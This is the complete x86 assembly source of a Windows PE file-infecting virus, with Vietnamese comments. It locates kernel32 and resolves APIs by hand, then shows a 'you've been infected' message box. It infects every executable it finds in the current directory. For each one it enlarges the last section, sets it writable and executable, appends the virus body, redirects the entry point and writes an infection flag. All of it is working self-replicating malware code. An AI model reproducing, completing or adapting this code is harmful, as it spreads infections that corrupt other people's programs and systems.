.386
.model flat, stdcall

option casemap:none 


.code

start:
incode segment

;==================================================================================
indep_start:
	
    call Delta
    Delta:
    pop ebp
    sub ebp,offset Delta


    mov esi,[esp] ;gia tri cua stack mang dia chi esp
    and esi,0FFFF0000h
    call GetK32
    jmp getInfo

;===================================================================================	

GetK32:
__1:
    cmp byte ptr [ebp + K32_Limit],00h
    jz WeFailed
    cmp word ptr [esi],"ZM"
    jz CheckPE
__2:

    sub esi,10000h
    dec byte ptr [ebp + K32_Limit]
    jmp __1   
CheckPE:

    mov edi,[esi + 3Ch]
    add edi,esi
    cmp dword ptr [edi],"EP"
    jz WeGotK32
    jmp __2
WeFailed:
    mov esi,0BFF70000h
WeGotK32:
    xchg eax,esi
    ret
;====================================================================================


getInfo:

    mov [ebp + offset Kernel32], eax ;luu dia chi kernel base
    mov edi, eax
    mov edi, [edi + 3ch] ;e_lfanew
    add edi , 78h ;
    add edi, [ebp + offset Kernel32]
    mov [ebp + offset RVAExport], edi
    mov edi, [edi]
    add edi, [ebp + offset Kernel32]
    mov [ebp + offset Export], edi
    mov esi, edi
    add esi, 1Ch
    LODSD
    add eax, [ebp + offset Kernel32]
    mov [ebp + offset AddressTableVA], eax
    LODSD
    add eax, [ebp + offset Kernel32]
    mov [ebp + offset NameTableVA], eax
    LODSD
    add eax, [ebp + offset Kernel32]
    mov [ebp + offset OrdinalTableVA], eax
    
    ;======================
    mov eax, [ebp+offset OldEP]
    mov [ebp+Old], eax
    
    ;======================
    
    xor eax,eax
    mov [ebp + offset Counter], eax
    
getNeededAPI:
    
    lea edi,[ebp + offset @@Offsetz]
    lea esi,[ebp + offset @@Namez]
    call GetAPIs               
    
    lea esi,[ebp + offset swUser32dll]
    push esi
    call [ebp + offset _LoadLibrary]
    
    lea esi, [ebp +  swMessageBoxA]
    push esi
    push eax
    call [ebp + offset _GetProcAddress]
    mov [ebp + offset _MessageBoxA], eax
    
    lea esi, [ebp +  @ExitProcess]
    push esi
    push eax
    call [ebp + offset _GetProcAddress]
    mov [ebp + offset _ExitProcess], eax

main: 
       
    ;=======================
    push 0 
    lea esi, [ebp + swHacked]
    push esi
    lea esi, [ebp + swHacked]
    push esi
    push 0
    call [ebp + offset _MessageBoxA]

   ; Find First File
    mov eax, offset FindData
	add eax, ebp
	push eax
	mov eax, offset FilePath
	add eax, ebp
	push eax
	call [ebp + _FindFirstFileA]
	mov [hFindFile + ebp], eax
	
        
checkFile:
    
    cmp dword ptr[FindData + ebp], 10h ; FILE_ATTRIBUTE_DIRECTORY	
	je  Find_Next			
	cmp dword ptr[FindData + ebp], 20h ; FILE_ATTRIBUTE_ARCHIVE
	jne Find_Next				
	
	jmp inflect
    
Find_Next:
   	mov eax, offset FindData
	add eax, ebp
	push eax
	push  [ebp + hFindFile]
	call [ebp + _FindNextFileA]
	
	cmp eax, 0 
	je exit   

    jmp checkFile
    
inflect: 
    ; lay handle filePathTest
    push 0
	push 20h
	push 3
	push 0
	push 1
	push 0C0000000h ; read write, ...
	mov eax, offset FindData + 44 ;offset
	add eax, ebp
	push eax
	call [ebp + offset _CreateFileA]
    mov [ebp + offset hFileHost], eax 
    ;hFileHost tra ve vi tri
check_PEFile:
    push 0
    push 0
    push 0
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset buffdw
    add eax, ebp
    push eax
    push [ebp + hFileHost]
    call [ebp + _ReadFile]
    
    mov ax, [ebp + buffdw] ;buffdw == 0
    cmp ax, 5a4dh
    jne Find_Next
    
    ;check isInflected:
    push 0
    push 0
    push 40h
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer] ;check 2 byte bat dau tu 40h
    
    push 0
    push 0
    push 2
    mov eax, offset buffdw
    add eax, ebp
    push eax
    push [ebp + hFileHost]
    call [ebp + _ReadFile]
    
    mov ax, [ebp + buffdw]
    cmp ax, 4b4fh ;neu co gia tri 4b4f thi da lay : Ky tu 'OK' flag
    
    je Find_Next
    
    ;point to 3Ch lay dia chi (elfa_new - PEOffset) 
	push 0
	push 0
	push 3Ch
	push [hFileHost + ebp]
	call [_SetFilePointer + ebp];/goto this
    
    ;get PEOffset
    push 0
    push 0
    push 4
    mov eax, offset PEOffset
    add eax, ebp
    push eax
    push [ebp + hFileHost]
    call [ebp + _ReadFile]
    mov eax , offset PEOffset
    
    ;get NumOfSections Offset: C6h;
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 6h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset NumOfSections
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    mov eax, offset NumOfSections
    
    ;get ImageBase offset: F4h
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 34h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset ImageBase
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    mov eax, offset ImageBase
    
    ;get Old EP of Host offset: E8h
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 28h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4 
    mov eax, offset OldEP
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    
    mov eax, [ebp + OldEP]
   	add eax, [ebp + ImageBase]
   	mov [ebp + OldEP], eax ;Luu xong gia tri cua EntryPoint cu,
   	;========================================
    ;=======================================
    
    ;get Section Alignment Offset : F8h
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 38h
    push eax
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 8
    mov eax, offset SectionAlignment
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    
    ;get File Alignment Offset : FCh
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 3ch
    push eax
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 8
    mov eax, offset FileAlignment
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    
    ;tim offset section cuoi
    ;Phuong phap tim section cuoi:
    ;gia su so section == 3
    ;section -= 1
    ;eax = C0 + them 100h -> startOfLastSection-> startOfLastSection += 28h*soSection
    
    mov ecx, [ebp + offset NumOfSections]
    dec ecx
    mov eax, [ebp + offset PEOffset]
    add eax, 100h
    mov [ebp + startOfLastSection], eax

    mov eax, 28h
    mul ecx
    
    add [ebp + startOfLastSection], eax
    
    ;//////////////////////////////////////////////////
    ;Characteristics
    mov eax, [ebp+startOfLastSection]
    
    add eax, 28
    push 0
    push 0
    push eax
    push [hFileHost + ebp]
    call [_SetFilePointer + ebp]
    
    push 0
    push 0
    push 4
    mov eax, offset character
    add eax, ebp
    push eax
    push [ebp + hFileHost]
    call [ebp + offset _ReadFile]
    
    mov eax,  [ebp + character]
    or eax, 0E0000020h
    mov [ebp + character], eax
    
    ;get data of last section start from VirtualSize
    mov eax, [ebp + startOfLastSection]
    
    push 0
	push 0
	push eax
	push [hFileHost + ebp]
	call [_SetFilePointer + ebp]
	
    push 0
    push 0
    push 20h
    mov eax, offset VirtualSize
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _ReadFile]
    mov eax, [ebp + RawSize]
    mov [ebp + oldRawSize], eax
    
    ;============================================================================================================
    ;change info of last section
    ;Characteristics
    mov eax, [ebp + character]
    mov [ebp + offset Characteristics], eax
    
    ;Calc RawSize and VirtualSize
    ;RawSize
    mov eax, offset indep_end - offset indep_start ;==A98h
    mov [ebp + offset VRSize], eax			;???????===> VRSize == A98h
    
    
    mov eax, [ebp + offset VRSize]			; Test value of VRSize
    add [ebp + offset RawSize], eax         ;??????                 
    
    mov eax, [ebp + offset RawSize]
    xor edx, edx
    div [ebp + FileAlignment]                  ; edx = phan du 
    mov eax,[ebp + offset FileAlignment]
    sub eax, edx
    add [ebp + RawSize], eax                   ; done RawSize = oldRawSize + VR Size + phan bu 
    
    mov [ebp + numOfByteToFill], eax
    
    mov eax, [ebp + offset RawSize]
    
    ;Co them gi vao day khong nhi??
    ;VirtualSize
    mov eax, [ebp + offset VRSize]
    add [ebp + offset VirtualSize], eax
    
    mov eax, [ebp + offset VirtualSize]
    xor edx, edx
    div [ebp + SectionAlignment]
    mov eax, [ebp + offset SectionAlignment]
    sub eax, edx
    add [ebp + VirtualSize], eax
    
    mov eax, [ebp + offset VirtualSize]
    
    ;==========================================================================================================
   
    ; write new info to last section
    ;Viet lai thong tin section cuoi sau khi SetFilePointer quay tro lai dau section cuoi
    push 1
    push 0
    push -20h
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 20h
    mov eax, offset VirtualSize 
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _WriteFile]
    
    ; calculate newEP
	push 2
	push 0
	push 0
	push [hFileHost + ebp]
	call [ebp + _SetFilePointer]                              ; eax = size Of Host
	mov [hostSize + ebp], eax
	sub eax, [ebp + RawAddress]
	add eax, [ebp + VirtualAddress]
	mov [ebp + NewEP], eax
    
    ; write virus to end of host
    push 2
    push 0
    push 0
    push [ebp + offset hFileHost]
    call [ebp + _SetFilePointer]
            
    push 0
	push 0
	push [ebp + offset VRSize]
	mov eax, offset indep_start
	add eax, ebp
	
	
	push eax
	push [offset hFileHost + ebp]
	call [ebp + offset _WriteFile]
    
    ;==========================================================
    ;O day them mot loat so NULL vao file Host
    ; fill Host with 00
    mov ecx, [ebp + numOfByteToFill]    
    
lap_fill:
    push ecx
    push 0
    push 0
    push 1
    mov  eax, offset byteNull								
    add  eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _WriteFile]
    pop ecx
    loop lap_fill
    ;==========================================================
    
    ;change to NewEP
    push 0
    push 0
    mov eax, [ebp + PEOffset]
    add eax, 28h
    push eax
    push [ebp+ offset hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset NewEP
    add eax, ebp
    push eax
    push [offset hFileHost +ebp]
    call [ebp + offset _WriteFile]

	mov eax, [ebp + VirtualSize]
	add eax, [ebp + VirtualAddress]
	mov [ebp + NewSize], eax
	
    push 0
    push 0
    mov eax, [ebp+PEOffset]
    add eax, 50h
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ _SetFilePointer]				;size of image pos
    
    push 0
    push 0
    push 4
    mov eax, offset NewSize
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _WriteFile]    

    ;check Done
    push 0
    push 0
    push 40h
    push [ebp + hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset flag ; write flag to check inflected
    add eax, ebp
    push eax
    push [ebp+ hFileHost]
    call [ebp+ _WriteFile]
	
	;===========tro ve host============

    jmp Find_Next

exit:   
	mov eax, [ebp + Old]
	jmp eax
    
    push [ebp + hFindFile]
    call [ebp + _CloseHandle]
    
	call [ebp + offset _ExitProcess]


GetAPI         proc


        mov     edx,esi                         ; Save ptr to name
 @_1:   cmp     byte ptr [esi],0                ; NULL?
        jz      @_2                             
        inc     esi                             ; tiep tuc tim kiem
        jmp     @_1                             
 @_2:   inc     esi                             
        sub     esi,edx                         ; ESI = API Name size
        mov     ecx,esi                         ; ECX = ESI = size of name

        xor     eax,eax                         ; EAX = 0
        mov     word ptr [ebp + offset Counter],ax       ; Counter set to 0
        mov esi, [ebp + offset NameTableVA]

 @_3:   push    esi                             ; Save ESI for l8r restore
        lodsd                                   ; Get value ptr ESI in EAX
        add     eax,[ebp + offset Kernel32]                ; Normalize
        mov     esi,eax                         ; ESI = VA of API name
        mov     edi,edx                         ; EDI = ptr to wanted API
        push    ecx                             ; ECX = API size
        cld                                     ; Clear direction flag     
        repe    cmpsb                           ; Compare both API names
        pop     ecx                             ; Restore ECX
        jz      @_4                             ; Jump if APIs are 100% equal
        pop     esi                             ; Restore ESI
        add     esi,4                           ; And get next value of array
        inc     word ptr [ebp + offset Counter]          ; Increase counter
        jmp     @_3                             ; Loop again


 @_4:   pop     esi                            			 	; Avoid shit in stack
        movzx   eax,word ptr [ebp + offset Counter]      		; Get in AX the counter
        shl     eax,1                           			; EAX = AX * 2
        add     eax,dword ptr [ebp + offset OrdinalTableVA] ; Normalize
        xor     esi,esi                         			; Clear ESI
        xchg    eax,esi                         			; EAX = 0, ESI = ptr to Ord
        lodsw                                   			; Get Ordinal in AX
        shl     eax,2                          				; EAX = AX * 4
        add     eax,dword ptr [ebp + offset AddressTableVA] 	; Normalize
        mov     esi,eax                         			; ESI = ptr to Address RVA
        lodsd                                   			; EAX = Address RVA
        add     eax,[ebp + offset Kernel32]               	; Normalize and all is done.
        ret



 GetAPI         endp

 GetAPIs        proc


 @@1:   push    esi
        push    edi
        call    GetAPI
        pop     edi
        pop     esi
        stosd
 @@2:   cmp     byte ptr [esi],0
        jz      @@3
        inc     esi
        jmp     @@2
 @@3:   cmp     byte ptr [esi + 1],0BBh
        jz      @@4
        inc     esi
        jmp     @@1
 @@4:   ret
 GetAPIs        endp


K32_Limit            	dw 5
hFileHost             	dd  ?

@@Namez                 label byte
@GetProcAddress         db "GetProcAddress",0
@LoadLibrary            db "LoadLibraryA",0
@ExitProcess            db "ExitProcess",0
@CloseHandle            db "CloseHandle",0
@CreateFileA            db "CreateFileA",0
@FindClose              db "FindClose",0
@FindFirstFileA         db "FindFirstFileA",0
@FindNextFileA          db "FindNextFileA",0
@GetCurrentDirectoryA   db "GetCurrentDirectoryA",0
@ReadFile               db "ReadFile",0
@SetFilePointer         db "SetFilePointer",0
@WriteFile              db "WriteFile",0
@lstrcatA               db "lstrcatA",0
                        db 0BBh

@@Offsetz               label byte
_GetProcAddress         dd 00000000h
_LoadLibrary            dd 00000000h
_ExitProcess            dd 00000000h
_CloseHandle            dd 00000000h
_CreateFileA            dd 00000000h
_FindClose              dd 00000000h
_FindFirstFileA         dd 00000000h
_FindNextFileA          dd 00000000h
_GetCurrentDirectoryA   dd 00000000h
_ReadFile               dd 00000000h
_SetFilePointer         dd 00000000h
_WriteFile              dd 00000000h
_lstrcatA               dd 00000000h
_VirtualProtect         dd 00000000h


@VirtualProtect         db "VirtualProtect",0

swHacked                db "Da bi nhiem virus nhe ^^!",0

swUser32dll             db "user32.dll",0
swKernel32dll           db "Kernel32.dll",0

swMessageBoxA           db "MessageBoxA",0
_MessageBoxA            dd 00000000h
_Kernel32dll            dd 000000000h
ddGetProcAddress        db 000000000h
byteNull                dw 0h

SectionAlignment        dd ?
FileAlignment           dd ?

VirtualSize				dd ?
VirtualAddress			dd ?
RawSize					dd ?	
RawAddress				dd ?		
Free					db 12 dup(?)
Characteristics			dd ?

hostSize            dd ?
flag                db "OK",0
OldSize             dd ?
SizeDiff            dd ?
oldRawSize          dd ?
ImageBase           dd ?
OldEP               dd ?
NewEP               dd ?
numOfByteToFill     dd ?
VRSize              dd ?
PEOffset            dd ?
NumOfSections       dd ?
buff                dd ?
Counter             dd ?
Kernel32            dd ?
RVAExport           dd ?
Export              dd ?
AddressTableVA      dd ?
NameTableVA         dd ?
OrdinalTableVA      dd ?
NewSize             dd ?
buffdw              dw ?
FilePath			db ".\*.*", 50 dup(0)
hFindFile			dd ?
FindData			db 592 dup (?) ,0

;===============================================================================================
startOfLastSection  dd ?
Old 				dd ?
OriginEP 			dd ?
character 			dd ?
newVirtualSize 		dd ?

indep_end: 
incode ends

end start